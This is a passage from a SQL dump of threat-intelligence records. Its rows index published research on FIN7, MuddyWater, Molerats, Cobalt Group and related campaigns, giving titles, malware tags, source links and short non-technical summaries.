Malware',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(596,518,'On the Hunt for FIN7',NULL,'https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html,https://www.flashpoint-intel.com/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/',NULL,'On Aug. 1, 2018, the United States District Attorney’s Office for the Western District of Washington unsealed indictments and announced the arrests of three individuals within the leadership ranks of a criminal organization that aligns with activity we have tracked since 2015 as FIN7. These malicious actors are members of one of the most prolific financial threat groups of this decade, having carefully crafted attacks targeted at more than 100 organizations. FIN7 is referred to by many vendors as “Carbanak Group,” although we do not equate all usage of the CARBANAK backdoor with FIN7. This blog explores the range of FIN7&amp;#39;s criminal ventures, the technical innovation and social engineering ingenuity that powered their success, a glimpse into their recent campaigns, their apparent use of a security company as a front for criminal operations, and what their success means for the threat landscape moving forward.','2020-12-04 10:24:32','2020-12-04 15:24:32','5b61f47f4ed88a31e35493db'),(597,48,'A Persistent Campaign Targeting CIS Countries with SOCKSBOT',NULL,'https://www.accenture.com/t00010101T000000Z__w__/gb-en/_acnmedia/PDF-83/Accenture-Goldfin-Security-Alert.pdf',NULL,'A number of security vendors reported a series of cyber-attacks involving the use of a\nmalware family called SOCKSBOT and claimed to be associated with CANDLEFISH (a.k.a.\nPatchwork, Dropping Elephant). However, as disclosed in this report, research by\niDefense analysts shows that SOCKSBOT was in fact used by a threat group in an 18-\nmonth-long campaign dubbed Goldfin, spoofing financial institutions in the\nCommonwealth of Independent States (CIS) countries since as early as February 2017 to\nas recently as May 2018. Based on the tactics, techniques and procedures (TTPs)\nobserved in this campaign, iDefense assesses with moderate confidence that the\nreported campaign is unlikely to be associated with CANDLEFISH.','2018-08-03 04:30:02','2018-08-03 09:30:02','5b64209a99bc2e1c06f5a73e'),(598,23,'FIN7 Recent Bateleur Malware Campaigns',NULL,'https://www.accenture.com/t20180803T064557Z__w__/us-en/_acnmedia/PDF-83/Accenture-Cyber-Threatscape-Report-2018.pdf,https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign',NULL,'While much reporting indicates that APT cyberattacks are espionage\nmotivated, financially motivated cyber criminals have also been stepping\nup their game since as early as 2013. Using TTPs akin to their espionage\ncounterparts, groups such as Cobalt Group and FIN7 have been targeting\nlarge financial institutions and restaurant chains with much success. The\nCobalt Group alone is said to be responsible for causing 1 billion euros\nworth (US$1.17 billion) of damage to the financial sector.','2018-11-22 03:52:20','2018-11-22 08:52:20','5b69d37292f5ac2b98346cf3'),(599,24,'Possible FIN7 Domains',NULL,'https://twitter.com/kyleehmke/status/1117729975484993536',NULL,'','2019-06-08 19:03:53','2019-06-09 00:03:53','5cb46aba498cfc2a71bb2936'),(600,6,'Mahalo FIN7','BOOSTWRITE,RDFSNIFFER','https://www.fireeye.com/blog/threat-research/2019/10/mahalo-fin7-responding-to-new-tools-and-techniques.html',NULL,'During several recent incident response engagements, FireEye Mandiant investigators uncovered new tools in FIN7’s malware arsenal and kept pace as the global criminal operators attempted new evasion techniques. In this blog, we reveal two of FIN7’s new tools that we have called BOOSTWRITE and RDFSNIFFER.','2019-11-08 19:01:02','2019-11-09 00:01:02','5d9f3036acdd17b6b5db4d3d'),(601,4,'Introducing BIOLOAD: FIN7 BOOSTWRITE’s Lost Twin',NULL,'https://www.fortinet.com/blog/threat-research/bioload-fin7-boostwrite-lost-twin.html',NULL,'Identification and summary of BIOLOAD by Fortinet.','2019-12-26 11:38:18','2019-12-26 16:38:18','5e04e1fa85c10c4bd5c6252c'),(602,4,'FIN7 Delivers Griffon backdoor over posted USB Keys','Griffon','https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/would-you-exchange-your-security-for-a-gift-card/',NULL,'We often talk about attackers targeting companies with social engineering attacks. These usually take the form of phishing attacks that attempt to trick the recipient into opening a malicious attachment or clicking on a malicious link. Less discussed are targeted attacks using physical media. Penetration Testers that perform physical \"pentests\" are well versed in dropping \"malicious\" USB sticks in a target\'s parking lot or waiting room. More complex are so-called \"Rubber Ducky\" (https://github.com/hak5darren/USB-Rubber-Ducky/wiki) attacks, where what looks like a USB stick is actually, in effect, a malicious USB keyboard preloaded with keystrokes. Those types of attacks are typically so explicitly targeted that it\'s rare to find them coming from actual attackers in the wild. Rare, but still out there.','2020-03-27 10:29:22','2020-03-27 15:29:22','5e7e18b31f7f5e7279c15455'),(603,5,'Possible FIN7 VBS delivered via \'Payment overdue\' malspam',NULL,'https://twitter.com/VK_Intel/status/1250189247895744517,https://github.com/k-vitali/Malware-Misc-RE/blob/master/2020-04-14-possible-fin7-vbs-ad-js-loader-initial-vk.raw.js',NULL,'Possible FIN7 VBS delivered via \'Payment overdue\' malspam','2020-04-15 11:51:28','2020-04-15 16:51:28','5e973b9172c3f4e1a4153960'),(604,2,'Pillowmint: FIN7’s Monkey Thief','Pillowmint','https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/pillowmint-fin7s-monkey-thief/',NULL,'TrustWave takes an in-depth technical look at Pillowmint malware samples received from their incident response investigations.','2020-06-23 15:53:04','2020-06-23 20:53:04','5ef26bb0fc9c0a243fd6bb22'),(605,16,'OpBlueRaven: Unveiling Fin7/Carbanak - Part II: BadUSB Attacks','Carbanak - S0030,Bella RAT,BadUSB,Tirion Loader','https://threatintel.blog/OPBlueRaven-Part2/,https://threatintel.blog/OPBlueRaven-Part1/,https://github.com/kdaoudieh/Bella',NULL,'This article aims to provide its readers with the details about PRODAFT & INVICTUS Threat Intelligence (PTI) team\'s latest operation on different threat actors; who have been detected to be working in cooperation with the notorious FIN7 APT group.\n\nWe appreciate all your support after the first part of this series. Before disclosing the relationship between Fin7 and REvil groups, we are trying to reach the ransomware victims. Until reaching all necessary parties, we will continue to publish articles about FIN7 attackers\' tools.','2020-10-01 19:04:12','2020-10-02 00:04:12','5f4fd46ac0f4e7ee5448bd40'),(606,83,'Analysis of the FIN7 JSSLOADER RAT','JSSLoader','https://blog.morphisec.com/the-evolution-of-the-fin7-jssloader,https://www.morphisec.com/hubfs/eBooks_and_Whitepapers/FIN7%20JSSLOADER%20FINAL%20WEB.pdf',NULL,'\"This report presents an attack chain that was intercepted and prevented within a customer’s network in December 2020, then will focus on a component from a typical FIN7 attack chain – JSSLoader. Though JSSLoader is well known as a minimized .NET RAT, not many details have been publicly available with respect to various capabilities such as exfiltration, persistence, auto-update, malware downloading, and more. Furthermore, in the many occasions where JSSLoader is mentioned, there are few details on the complete attack chain. The following provides a never-before-seen technical analysis of this infamous group’s JSSLoader as part of an end-to-end attack.\"','2021-01-04 14:45:27','2021-01-04 19:45:27','5ff37057aba1bd56afb7e0cb'),(607,69,'FIN7 infrastructure and tooling IOCs','DiceLoader,GRIFFON - S0417,BirdDog,Carnabak','https://twitter.com/z0ul_/status/1401795127601991682',NULL,'Updates in indicators of compromise for the FIN7 actor malware tooling and infrastructure.','2021-07-07 19:01:55','2021-09-08 15:18:38','60be3e3f6ba2c7d1bec747a2'),(608,22,'A dive into MuddyWater APT targeting Middle-East',NULL,'https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/',NULL,'MuddyWater is a threat actor that caught our attention for their extensive use of “Living off the Land” attacks in a targeted campaign aimed at the Middle East. During our investigation we reconstruct the evolution of the vectors used and how the group operates to  target their victims, evade detections and move laterally inside the compromised infrastructures.','2017-11-29 06:52:24','2017-11-29 11:52:24','5a1e9f78ff178b362bdc0e27'),(609,703,'Updated MuddyWater activity',NULL,'https://sec0wn.blogspot.com/2018/02/burping-on-muddywater.html,https://blog.trendmicro.com/trendlabs-security-intelligence/campaign-possibly-connected-muddywater-surfaces-middle-east-central-asia/,https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html',NULL,'Updated MuddyWater activity as reported by sec0wn and TrendMicro. A new campaign targeting organizations in Turkey, Pakistan and Tajikistan that has some similarities with an earlier campaign named MuddyWater, which hit various industries in several countries, primarily in the Middle East and Central Asia. Third party security researchers named the MuddyWater campaign as such because of the difficulties in attributing the attacks. However, given the nature of the targets, as well as the gathering and uploading of information to C&amp;C servers, it appears that the attackers are mainly concerned with espionage activities — with the Saudi Arabia’s National Cyber Security Center (NCSC) publishing an alert on their website regarding the attacks.','2019-03-15 07:37:58','2019-03-15 12:37:58','5aa7210cb2d9185b6f1a79e5'),(610,397,'Clearing the MuddyWater - Analysis of new MuddyWater Samples',NULL,'https://sec0wn.blogspot.ae/2018/05/clearing-muddywater-analysis-of-new.html',NULL,'New MuddyWater samples have lots of similarities with the ones from earlier in the year, there are still some interesting aspects and additional, you guessed it, obfuscation used in the new samples. Their heavy focus on layered obfuscation and preference for PowerShell is still apparent. However, I will highlight what changed based on the samples that I have analyzed.','2018-10-15 04:01:59','2018-10-15 09:01:59','5af207a8b5b07f11178f5aad'),(611,2,'Another Potential MuddyWater Campaign uses Powershell-based PRB-Backdoor',NULL,'https://blog.trendmicro.com/trendlabs-security-intelligence/another-potential-muddywater-campaign-uses-powershell-based-prb-backdoor/',NULL,'The MuddyWater campaign was first sighted in 2017 when it targeted the Saudi government using an attack involving PowerShell scripts deployed via Microsoft Office Word macro. In March 2018, we provided a detailed analysis of another campaign that bore the hallmarks of MuddyWater.\n\nIn May 2018, we found a new sample (Detected as W2KM_DLOADR.UHAOEEN) that may be related to this campaign. Like the previous campaigns, these samples again involve a Microsoft Word document embedded with a malicious macro that is capable of executing PowerShell (PS) scripts leading to a backdoor payload. One notable difference in the analyzed samples is that they do not directly download the Visual Basic Script(VBS) and PowerShell component files, and instead encode all the scripts on the document itself. The scripts will then be decoded and dropped to execute the payload without needing to download the component files.','2018-06-14 23:52:47','2018-06-15 04:52:47','5b23461fb45c923a8bba290d'),(612,71,'MuddyWater expands operations',NULL,'https://securelist.com/muddywater/88059/',NULL,'AlienVault has added additional indicators. MuddyWater is a relatively new APT that surfaced in 2017. It has focused mainly on governmental targets in Iraq and Saudi Arabia, according to past telemetry. However, the group behind MuddyWater has been known to target other countries in the Middle East, Europe and the US. We recently noticed a large amount of spear phishing documents that appear to be targeting government bodies, military entities, telcos and educational institutions in Jordan, Turkey, Azerbaijan and Pakistan, in addition to the continuous targeting of Iraq and Saudi Arabia, other victims were also detected in Mali, Austria, Russia, Iran and Bahrain.. These new documents have appeared throughout 2018 and escalated from May onwards. The attacks are still ongoing.\nThe new spear-phishing docs used by MuddyWater rely on social engineering to persuade users to enable macros. The attackers rely on a range of compromised hosts to deliver their attacks.','2018-10-15 08:45:36','2018-10-15 13:45:36','5bbe091f10902b1d7dec1a75'),(613,16,'MuddyWater Operations in Lebanon and Oman',NULL,'https://www.clearskysec.com/muddywater-operations-in-lebanon-and-oman/',NULL,'MuddyWater is an Iranian high-profile threat actor that’s been seen active since 2017. The group is known for espionage campaigns in the Middle East. Over the past year, we’ve seen the group extensively targeting a wide gamut of entities in various sectors, including Governments, Academy, Crypto-Currency, Telecommunications and the Oil sectors.','2018-11-28 07:19:35','2018-11-28 12:19:35','5bfe87d8d76ca078dcf08bda'),(614,30,'Seedworm Group Compromises Government Agencies, Oil &amp; Gas, NGOs, Telecoms, and IT Firms',NULL,'https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group',NULL,'Symantec researchers have uncovered extensive insights into a cyber espionage group behind a recent series of cyber-attacks designed to gather intelligence on targets spread primarily across the Middle East as well as in Europe and North America.','2018-12-11 05:23:49','2018-12-11 10:23:49','5c0f003e5bdcee22f015faaa'),(615,2,'Muddy Waters PowerShell Backdoor Analysis',NULL,'https://threatrecon.nshc.net/2019/03/07/sectord02-powershell-backdoor-analysis/',NULL,'In this case, the target of this malware was Turkey, although it has been reported that they also sometimes target countries outside of the Middle East. One characteristic of SectorD02 (Muddy Waters) is their incrementally changing PowerShell backdoor.','2019-03-07 05:02:43','2019-03-07 10:02:43','5c80ec44746bf807b9e7c801'),(616,10,'MuddyWater APTs latest attack against Iraqi mobile operator Korek Telecom',NULL,'https://mp.weixin.qq.com/s/NN_iRvwA6yOHFS9Z3A0RBA?,https://twitter.com/360TIC/status/1108616188173520896',NULL,'Recently, the 360 Threat Intelligence Center intercepted a sample of targeted attacks against Iraqi mobile operators ( Korek Telecom ). The operator is Iraqs fastest-growing mobile company serving 18 provinces in Iraq , serving businesses, governments and individual users. The attack sample was delivered using a spear phishing email: the victim was induced to open the attached Office Word document and the malicious macro was enabled. The malicious macro code will eventually release the back door of the PowerShell implementation , enabling remote control of the victims computer. After tracking and correlating, the 360 Threat Intelligence Center found that the attack was suspected to be related to the MuddyWater APT organization and traced and analyzed several malicious samples related to it.','2019-03-21 09:57:12','2019-03-21 14:57:12','5c939fbb22017040b7e47be4'),(617,67,'The Muddy Waters of APT Attacks',NULL,'https://research.checkpoint.com/the-muddy-waters-of-apt-attacks/',NULL,'The Iranian APT, MuddyWater, has been active since at least 2017. Most recently though, a new campaign, targeting Belarus, Turkey and Ukraine, has emerged that caught the attention of Check Point researchers.','2020-05-18 16:34:36','2020-05-18 21:34:36','5caf93777439561cb57d0e2c'),(618,31,'Iranian APT MuddyWater Attack Infrastructure Targeting Kurdish Political Groups and Organizations in Turkey',NULL,'https://www.clearskysec.com/muddywater-targets-kurdish-groups-turkish-orgs/',NULL,'In ClearSkys ongoing investigations of Iranian APTs, they recently detected additional documents related to previously attack infrastructures used by the Iranian APT – “MuddyWater”, which we reported on in late November 2018.','2019-04-15 11:38:44','2019-04-15 16:38:44','5cb4b3944f62ba0873339ee1'),(619,9,'MuddyWater blending in the crowd',NULL,'https://securelist.com/muddywaters-arsenal/90659/',NULL,'MuddyWater is an APT with a focus on governmental and telco targets in the Middle East (Iraq, Saudi Arabia, Bahrain, Jordan, Turkey and Lebanon) and also a few other countries in nearby regions (Azerbaijan, Pakistan and Afghanistan).','2019-04-29 04:34:32','2019-04-29 09:34:32','5cc6c4ec307260c92c2ba7ed'),(620,19,'Recent MuddyWater-associated BlackWater Campaign Shows Signs of New Anti-detection Techniques',NULL,'https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html',NULL,'Cisco Talos assesses with moderate confidence that a campaign we recently discovered called &quot;BlackWater&quot; is associated with suspected persistent threat actor MuddyWater. Newly associated samples from April 2019 indicate attackers have added three distinct steps to their operations, allowing them to bypass certain security controls and suggesting that MuddyWater&#39;s tactics, techniques and procedures (TTPs) have evolved to evade detection. If successful, this campaign would install a PowerShell-based backdoor onto the victim&#39;s machine, giving the threat actors remote access. While this activity indicates the threat actor is taking steps to improve its operational security and avoid endpoint detection, the underlying code remains unchanged. The findings outlined in this blog should help threat hunting teams identify MuddyWater&#39;s latest TTPs.','2019-05-20 10:10:34','2019-05-20 15:10:34','5ce2c36a67a0d63bbf18b120'),(621,21,'Iranian APT group MuddyWater Adds Exploits to Their Arsenal',NULL,'https://www.clearskysec.com/wp-content/uploads/2019/06/Clearsky-Iranian-APT-group-%E2%80%98MuddyWater%E2%80%99-Adds-Exploits-to-Their-Arsenal.pdf',NULL,'Clearsky has detected new and advanced attack vector used by MuddyWater to target governmental entities and the telecommunication sector. Notably, the TTP includes decoy documents exploiting CVE-2017-0199 as the first stage of the attack. This is followed by the second stage of the attack – communication with the hacked C2 servers and downloading a file infected with the macros.','2019-06-06 09:06:07','2019-06-06 14:06:07','5cf91dcf286cc3dc70de69f5'),(622,8,'How MuddyWater hackers attacked a Turkish military electronics manufacturer',NULL,'https://habr.com/ru/company/group-ib/blog/452540/,https://0xffff0800.blogspot.com/2019/06/a-muddywater-cyber-spy.html',NULL,'Report possibly identifying members of the Muddy Waters group.','2019-06-11 07:19:56','2019-06-11 12:19:56','5cff99ce6eb074716688bd54'),(623,36,'MuddyWater attacks organization in Tajikistan',NULL,'https://mp.weixin.qq.com/s/ko5ct9mnW78pD_RRqEUSkg,https://twitter.com/tlansec/status/1146337748501983233,https://twitter.com/CyberAuthority/status/1146758988316520451',NULL,'','2019-07-05 05:09:32','2019-07-05 10:09:32','5d1ca1cffbe3e57a92ddff03'),(624,21,'MuddyWater Uses New Attack Methods in a Recent Attack Wave','POWERSTATS','https://docs.google.com/document/d/1oYX3uN6KxIX_StzTH0s0yFNNoHDnV8VgmVqU5WoeErc/mobilebasic',NULL,'During October-November, the Iranian attack group MuddyWater carried out new attacks against several targets in the Middle East, mostly in Iraq. This group has been previously active in Israel and are known for infecting targets using DOC files and social engineering.\n\nIn this attack wave, we identified for the first time a malware that is designed to attack in Iran by impersonating an international Iranian shipping company - Azim Tarabar. It is possible that the group also engages in internal espionage, in addition to its ongoing activities in the Middle East.\n\nThe group began preparing the recent attack infrastructure on August 19. The infrastructure is built on hacked servers that were previously used to store code for the POWERSTATS malware, as well as new hacked servers, like a server by the Saudi firm KSA Hosting. Similar to the group\'s previous activity, the group hacks into the servers almost always by penetrating into WordPress based open directories in order to plant the malware code.','2019-11-21 08:31:47','2019-11-21 13:31:47','5dd691c33a60512b0675ee35'),(625,27,'Muddy Water Strikes Again in Summer Mirage Campaign','Powerstats','https://blog.prevailion.com/2020/01/summer-mirage.html',NULL,'The research team at Prevailion has uncovered new aspects of sophisticated campaigns that we associate with high confidence to the Muddy Water threat actors. Security researchers, such as FireEye, have stated Muddy Water activity was tied to a group with an Iran-nexus. We have dubbed this campaign “Summer Mirage,” and we assess that it is a continuation of activity previously reported campaign called “BlackWater”.','2020-01-09 10:34:23','2020-01-09 15:34:23','5e1747ff614f5a153bbc1c08'),(626,5,'MuddyWater communicating with compromised Site',NULL,'https://twitter.com/JohnnyBelinda4/status/1219131508956565505,https://twitter.com/c3rb3ru5d3d53c/status/1218958514124722176',NULL,'New MuddyWater sample that communicates with a compromised Wordpress host.','2020-01-21 04:11:57','2020-01-21 09:11:57','5e26c05d5b37bdc198782b15'),(627,37,'MuddyWater’s Campaign Against Israeli Organizations: Operation Quicksand',NULL,'https://www.clearskysec.com/wp-content/uploads/2020/10/Operation-Quicksand.pdf,https://www.clearskysec.com/operation-quicksand/,https://twitter.com/AnonySecAgency/status/1348555329462743040',NULL,'During September 2020, we identified a new campaign targeting many prominent Israeli organizations. The campaign was attributed to the Iranian threat actor ‘MuddyWater’ (also known as TEMP.Zagros, Static Kitten and Seedworm). MuddyWater was previously exposed as a contractor for the IRGC (Islamic Republic Guard Corps).','2021-01-11 12:19:05','2021-01-11 17:19:05','5f886761020a5e059b24dd74'),(628,21,'MuddyWater\'s Spying App Uses Afghanistan Election Lure','AndroidOS_Mudwater,AndroidOS_HiddenAp','https://twitter.com/bl4ckh0l3z/status/1306858441332461573',NULL,'In mid-September independent security researcher @bl4ckh0l3z tweeted about a MuddyWater campaign that used an Afghanistan Election lure to entice users to install an Android spying and information stealing application.','2020-11-28 19:02:47','2020-11-29 00:02:47','5f9c69c8a703db01e468b75e'),(629,4,'Likely MuddyWater Maldoc targeting UAE University',NULL,'https://twitter.com/h2jazi/status/1329188203178373120,https://twitter.com/ShadowChasing1/status/1329247256122322944',NULL,'Likely MuddyWater Maldoc targeting UAE University.  ورشة عمل تدریبیة.doc . Training workshop. Doc','2020-12-18 19:02:11','2020-12-19 00:02:11','5fb6cd8f40663e290766fdff'),(630,27,'Earth Vetala MuddyWater Continues to Target Organizations in the Middle East','LaZagne - S0349,Trojan.Win64.PASSDUMP,Win32.ScreenConnect,HackTool.Win64.LIGOLO,SharpChisel,HackTool.Win64.BrowserDumper','https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html',NULL,'Trend Micro researchers recently detected activity suspected to be from MuddyWater. This campaign targets various organizations in the Middle East and neighboring regions.','2021-03-08 13:40:07','2021-03-08 18:40:07','6046610e340da53cb36e0a9c'),(631,22,'Operation Molerats: Middle East Cyber Attacks Using Poison Ivy',NULL,'https://www.fireeye.com/blog/threat-research/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html',NULL,'In October 2012, malware attacks against Israeli government targets grabbed media attention as officials temporarily cut off Internet access for its entire police force and banned the use of USB memory sticks. [1] Security researchers subsequently linked these attacks to a broader, yearlong campaign that targeted not just Israelis but Palestinians as well. [2] — and as discovered later, even the U.S. and UK governments. [3] Further research revealed a connection between these attacks and members of the so-called “Gaza Hackers Team.” We refer to this campaign as “Molerats.”','2017-07-22 05:24:56','2017-07-22 10:24:56','5543b850b45ff525dd8efa19'),(632,223,'Operation DustySky',NULL,'http://www.clearskysec.com/dustysky/',NULL,'DustySky (called “NeD Worm” by its developer) is a multi-stage malware in use since May 2015. It is in use by the Molerats (aka Gaza cybergang), a politically motivated group whose main objective, we believe, is intelligence gathering.  Operating since 2012, the group’s activity has been reported by Norman [1], Kaspersky[2] [3], FireEye[4], and PwC[5].\nThese attacks are targeted, but not spear-phished. I.e., malicious email messages are sent to selected targets rather than random mass distribution, but are not tailored specifically to each and every target. Dozens of targets may receive the exact same message. The email message and the lure document are written in Hebrew, Arabic or English – depending on the target audience.','2017-08-24 05:44:34','2017-08-24 10:44:34','568e917967db8c057c6fc800'),(633,74,'Operation DustySky – Part 2',NULL,'http://www.clearskysec.com/wp-content/uploads/2016/06/Operation-DustySky2_-6.2016_TLP_White.pdf',NULL,'[clearskysec] Attacks against all targets in the Middle East stopped at once, after we published our first report. However, the attacks against targets in the Middle East (except Israel) were renewed in less than 20 days. In the beginning of April 2016, we found evidence that the attacks against Israel have been renewed as well.\nBased on the type of targets, on Gaza being the source of the attacks, and on the type of information the attackers are after - we estimate with medium-high certainty that the Hamas terrorist organization is behind these attacks.','2017-03-07 10:03:44','2017-03-07 15:03:44','5759741f78e335013763cea0'),(634,80,'Operation Electric Powder – Who is targeting Israel Electric Company?',NULL,'http://www.clearskysec.com/iec/#att123,https://twitter.com/ClearskySec/status/1055404788635103232',NULL,'From April 2016 and at least until February 2017,  attackers have been spreading malware via fake Facebook profiles and pages, breached websites, self-hosted and cloud based websites. Various artifices indicate that the main target of this campaign is IEC – Israel Electric Company. These include domains, file names, Java package names,  and Facebook activity. We dubbed this campaign “Operation Electric Powder“.','2018-10-25 06:27:14','2018-10-25 11:27:14','58c82bf4e39bdf5b8e4165de'),(635,22,'Operation Desert Eagle',NULL,'https://mymalwareparty.blogspot.co.uk/2017/07/operation-desert-eagle.html',NULL,'Operation Desert Eagle takes a look into the recent activity of the Molerats (Gaza cybergang) group.','2017-07-07 18:48:10','2017-07-07 23:48:10','595f95f16a5215730c7221a0'),(636,316,'Operation Wilted Tulip',NULL,'http://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf',NULL,'CopyKittens is a cyberespionage group that has been operating since at least 2013. \n\nIn November 2015, ClearSky and Minerva Labs published the first public report exposing its activity. In March 2017, ClearSky published a second report exposing further incidents, some of which impacted the German Bundestag. In this report, Trend Micro and ClearSky expose a vast espionage apparatus spanning the entire time the group has been active. It includes recent incidents as well as older ones that have not been publicly reported; new malware; exploitation, delivery and command and control infrastructure; and the group&#39;s modus operandi.\nWe dubbed this activity Operation Wilted Tulip','2017-07-27 08:43:48','2017-07-27 13:43:48','59771d58481b4c67d4f5f810'),(637,14,'Further Gaza Cybergang Activity',NULL,'http://www.freebuf.com/vuls/142970.html',NULL,'','2017-12-14 15:48:02','2017-12-14 20:48:02','598adf1691ade03d6c7e0aac'),(638,178,'BadPatch',NULL,'https://researchcenter.paloaltonetworks.com/2017/10/unit42-badpatch/',NULL,'In April 2017, in collaboration with Clearsky, Palo Alto Networks Unit 42 published an article about our research into targeted attacks in the Middle East. In that research we discussed two new malware families we named KASPERAGENT and MICROPSIA.\n\nSince then, we have continued our research into the Command and Control (C2) infrastructure associated with KASPERAGENT and MICROPSIA. This ongoing research lead us to a new Middle Eastern campaign. Our findings from this new campaign include C2 infrastructure, new attack methods, four types of malware (including Android malware), a system for management of stolen victim data and some detail of the actors.','2017-10-20 08:05:08','2017-10-20 13:05:08','59e9f438e9106d657669039a'),(639,64,'Gaza Cybergang – updated activity in 2017',NULL,'https://securelist.com/gaza-cybergang-updated-2017-activity/82765/',NULL,'The Gaza cybergang is an Arabic-language, politically-motivated cybercriminal group, operating since 2012 and actively targeting the MENA (Middle East North Africa) region. The Gaza cybergang’s attacks have never slowed down and its typical targets include government entities/embassies, oil and gas, media/press, activists, politicians, and diplomats.','2017-10-30 13:39:13','2017-10-30 18:39:13','59f771d275dae613f38bfed0'),(640,88,'Continued Molerats Activity',NULL,'https://docs.google.com/document/d/1oYX3uN6KxIX_StzTH0s0yFNNoHDnV8VgmVqU5WoeErc,https://twitter.com/ClearskySec/status/929998314002673666,https://blog.fortinet.com/2017/11/22/cve-2017-11826-exploited-in-the-wild-with-politically-themed-rtf-document',NULL,'Ongoing reporting by ClearSky','2017-11-27 12:00:13','2017-11-27 17:00:13','5a0b0b46fee07f41c7a21123'),(641,59,'Operation JOKAA(RR)',NULL,'https://mymalwareparty.blogspot.com/2018/11/operation-jokaarr.html',NULL,'Operation JOKAA(RR) looks into the continued activities of the Mole Rats/Gaza Cybergang Threat Actor and their new TTPS. This report builds on their previous activities as found in:','2018-11-15 04:47:28','2018-11-15 09:47:28','5bed3e7c49c15561eae9e92c'),(642,14,'Suspected Molerats New Attack in the Middle East',NULL,'https://ti.360.net/blog/articles/suspected-molerats-new-attack-in-the-middle-east/',NULL,'Recently, 360 Threat Intelligence Center captured a bait document designed specifically for Arabic users. It is an Office Word document with malicious macros embedded to drop and execute a backdoor packed by Enigma Virtual Box. The backdoor program has a built-in keyword list containing names of people or opera movies to communicate with C2, distributes control commands to further control the victims computer device. After investigation, we suspect this attack is carried out by Molerats.','2019-11-29 08:10:29','2019-11-29 13:10:29','5c65419951fbf2731768c9d1'),(643,13,'More terrorism themed spearphishing from MoleRats',NULL,'https://twitter.com/blackorbird/status/1183599882801537029',NULL,'More terrorism themed spearphishing from the Middle Eastern MoleRats group','2019-10-14 04:29:58','2019-10-14 09:29:58','5da440175f66e58afbdf6cc3'),(644,15,'Palestinian Themed Attack','H-worm','https://mp.weixin.qq.com/s/lUtXwWjPVMHXfR6oLnXYhQ',NULL,'Arabic malicious documents relating to the Palestinian elections.','2019-11-18 06:05:27','2019-11-18 11:05:27','5dd27af757b18947b0544345'),(645,105,'Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations',NULL,NULL,NULL,'\"Between October 2019 through the beginning of December 2019, Unit 42 observed multiple instances of phishing attacks likely related to a threat group known as Molerats (AKA Gaza Hackers Team and Gaza Cybergang) targeting eight organizations in six different countries in the government, telecommunications, insurance and retail industries, of which the latter two were quite peculiar. The targeting of insurance and retail organizations is peculiar as it does not fit with this threat groups prior target set. The email subject and attachment file names used in the attacks on these seemingly atypical targets were similar in theme as those used when attacking government organizations. The lack of industry or target specific social engineering themes likely lowers the chances of a successful compromise and further confuses our understanding of the purpose of attacking these organizations.\"','2020-03-03 10:42:37','2020-03-03 15:42:37','5e5e6ed9faa93bc6a60f038c'),(646,11,'Android \"Welcome Chat\" app Molerats Campaign',NULL,'https://www.welivesecurity.com/2020/07/14/welcome-chat-secure-messaging-app-nothing-further-truth/',NULL,'\"We discovered a new operation within a long-running cyber-espionage campaign in the Middle East. Targeting Android users via the malicious Welcome Chat app, the operation appears to have links to the malware named BadPatch, which MITRE links to the Gaza Hackers threat actor group known also as Molerats.\"','2020-07-14 10:31:22','2020-07-14 15:31:22','5f0dcfcaedaed628a054183d'),(647,18,'New TA402 Molerats Malware Targets Governments in the Middle East','LastConn,SharpStage - S0546,Loda,MiraiEye','https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east',NULL,'Proofpoint researchers identified a malware called LastConn distributed by TA402, a threat actor also known as Molerats. The malware targeted government institutions in the Middle East and global government organizations associated with geopolitics in the region.','2021-07-17 19:00:48','2021-07-17 00:03:22','60cb37bf5fe8246bb2556969'),(648,9,'Spear-phishing campaign leveraging on MSXSL',NULL,'https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/',NULL,'We have identified an ongoing spear-phishing campaign targeting a variety of entities with malicious RTF documents exploiting three different vulnerabilities: CVE-2017-8570, CVE-2017-11882 and CVE-2018-0802 and taking advantage of a misplaced trust binary, Microsoft’s msxsl, to run a JScript backdoor. The whole attack chain leverages on system’s signed components to remain under the radar as much as possible and it shares many similarities with previous campaigns from the Cobalt Group.','2018-03-03 10:03:46','2018-03-03 15:03:46','5a9ab94d7b0bf651cd35e875'),(649,38,'New Cobalt Group campaign targeting eastern Europe and Russian institutions',NULL,'https://asert.arbornetworks.com/double-the-infection-double-the-fun/',NULL,'Cobalt Group (aka TEMP.Metastrike), active since at least late 2016, have been suspected in attacks across dozens of countries. The group primarily targets financial organizations, often with the use of ATM malware. Researchers also believe they are responsible for a series of attacks on the SWIFT banking system which costs millions in damages to the impacted entities.\n\nOn August 13, ASERT observed the financially-motivated hacking group actively pushing a new campaign. We believe the targeted institutions for the ongoing campaign are located in eastern Europe and Russia.  The active campaigns utilize spear phishing messages to gain entry. The emails appear to come from a financial vendor or partner, increasing the likelihood of infection.  The group uses tools that can bypass Window’s defenses.','2018-08-30 12:50:56','2018-08-30 17:50:56','5b882e5ba58afc0e76b3b79c'),(650,4,'Cobalt Group ThreadKit Updates from October 2018',NULL,'https://www.fidelissecurity.com/sites/default/files/CobaltGroup_nov2018.pdf',NULL,'Since 2016, Cobalt Group used alexusMailer 2.0, also known as iPosylka, to send spearphishing emails containing malicious attachments to targets. In 2016, Cobalt Group targeted banks in Eastern Europe using lure attachments containing exploits, which when executed, allowed the group to compromise servers that controlled ATMs, stealing over $32,000 overnight from six ATMs in Eastern Europe.','2018-12-19 06:47:07','2018-12-19 11:47:07','5c1a2fbb1cc7a510f192ecc6'),(651,9,'Cobalt Group Returns To Kazakhstan',NULL,'Cobalt Group Returns To Kazakhstan',NULL,'Cobalt Group is a financially motivated 